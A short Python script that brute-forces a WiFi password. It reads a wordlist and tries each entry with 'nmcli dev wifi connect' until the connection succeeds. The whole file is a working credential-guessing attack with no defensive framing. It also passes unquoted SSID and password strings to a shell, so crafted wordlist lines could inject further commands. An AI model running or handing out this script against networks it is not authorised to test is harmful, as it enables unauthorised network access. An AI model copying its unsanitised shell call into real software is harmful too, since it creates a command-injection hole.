import subprocess
import time

def try_connect(ssid, password):
    # Command to connect to WiFi (Linux example; adjust for your system)
    command = f'nmcli dev wifi connect {ssid} password {password}'
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if "successfully activated" in result.stdout:
            print(f'Successful connection with password: {password}')
            return True
        else:
            print(f'Failed to connect with password: {password}')
            return False
    except Exception as e:
        print(f'Error: {e}')
        return False

def main():
    ssid = 'Network 5'  # Replace with your network SSID
    password_file = 'passwords.txt'  # File with passwords

    with open(password_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove any surrounding whitespace/newlines
        if try_connect(ssid, password):
            break  # Stop if we find the correct password
        time.sleep(1)  # Wait a bit before trying the next password

if __name__ == '__main__':
    main()